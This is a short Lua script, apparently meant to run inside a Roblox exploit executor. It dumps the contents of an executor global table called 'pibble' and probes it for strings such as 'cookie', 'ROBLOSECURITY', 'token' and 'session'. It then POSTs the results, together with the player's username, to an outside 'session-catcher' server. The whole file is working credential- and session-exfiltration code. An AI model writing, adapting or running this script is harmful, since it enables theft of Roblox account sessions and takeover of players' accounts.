local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local pibbleTableDump = {}

pcall(function()
    local genv = getgenv()
    local pbl = genv and genv.pibble
    if pbl then
        local ok, tbl = pcall(pbl.getpibbles)
        if ok and type(tbl) == "table" then
            for k, v in pairs(tbl) do
                if type(v) == "string" then
                    pibbleTableDump[tostring(k)] = v:sub(1, 500)
                elseif type(v) == "number" or type(v) == "boolean" then
                    pibbleTableDump[tostring(k)] = tostring(v)
                elseif type(v) == "table" then
                    local sub = {}
                    for k2, v2 in pairs(v) do
                        if type(v2) == "string" then
                            sub[tostring(k2)] = v2:sub(1, 300)
                        else
                            sub[tostring(k2)] = tostring(v2)
                        end
                    end
                    pibbleTableDump[tostring(k)] = sub
                else
                    pibbleTableDump[tostring(k)] = type(v)
                end
            end
        else
            pibbleTableDump["error"] = "getpibbles returned: " .. type(tbl)
        end
    end
end)

-- Также пробуем is_pibble с разными аргументами
local pibbleChecks = {}
pcall(function()
    local genv = getgenv()
    local pbl = genv and genv.pibble
    if pbl and pbl.is_pibble then
        local testStrings = {"cookie", "ROBLOSECURITY", "token", "session", "auth", 
                             "security", "login", "Delta", "pibble", "gmail", "washington"}
        for _, s in ipairs(testStrings) do
            local ok, res = pcall(pbl.is_pibble, s)
            pibbleChecks[s] = ok and tostring(res) or "ERR: " .. tostring(res):sub(1, 100)
        end
    end
end)

local payload = {
    username = LocalPlayer.Name,
    pibbleTableDump = pibbleTableDump,
    pibbleChecks = pibbleChecks
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Catcher] getpibbles dump sent")
